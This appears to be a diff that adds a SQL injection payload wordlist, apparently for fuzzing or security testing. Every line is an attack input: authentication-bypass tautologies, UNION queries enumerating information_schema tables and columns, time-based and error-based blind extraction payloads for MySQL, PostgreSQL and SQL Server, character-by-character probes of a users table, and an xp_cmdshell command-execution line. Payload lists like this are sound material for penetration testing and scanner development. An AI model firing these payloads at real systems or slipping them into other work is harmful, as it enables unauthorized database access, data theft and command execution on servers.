@@ -1,0 +1,73 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+`OR 1=1--
+' OR 'x'='x
+') OR ('1'='1
+')) OR (('1'='1
+' OR ''='
+1' OR '1'='1'--
+1" OR "1"="1"--
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+" UNION SELECT NULL--
+' UNION ALL SELECT NULL--
+1 UNION SELECT user(),version(),database()--
+' UNION SELECT table_name,2,3 FROM information_schema.tables--
+' UNION SELECT column_name,2,3 FROM information_schema.columns--
+1 AND SLEEP(2)--
+1' AND SLEEP(2)--
+1" AND SLEEP(2)--
+1 AND SLEEP(2)#
+1'); WAITFOR DELAY '0:0:2'--
+'; WAITFOR DELAY '0:0:2'--
+1 AND 1=1 WAITFOR DELAY '0:0:2'--
+1; SELECT SLEEP(2)--
+'; SELECT pg_sleep(2)--
+1 AND pg_sleep(2)--
+1' AND pg_sleep(2)--
+'; SELECT pg_sleep(2)--
+' AND SLEEP(2) AND '1'='1
+" AND SLEEP(2) AND "1"="1
+1 AND 1=(SELECT 1 FROM (SELECT SLEEP(2))a)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
+1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),(SELECT version()),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+' EXEC sp_executesql N'SELECT 1'--
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR),0x20)),1,1))>64--
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+' OR 1=1 LIMIT 1--
+' OR '1'='1'/*
+' HAVING 1=1--
+' GROUP BY columnnames HAVING 1=1--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+-1 UNION SELECT 1,2,3--
+-1' UNION SELECT 1,2,3--
+-1" UNION SELECT 1,2,3--
+0 UNION SELECT NULL--
+%27 OR %271%27%3D%271
+%22 OR %221%22%3D%221
+\' OR \'1\'=\'1
+\\" OR \\"1\\"=\\"1
+' AND 1=1 AND '1'='1
+' AND 1=2 AND '1'='1
+1' AND '1'='2
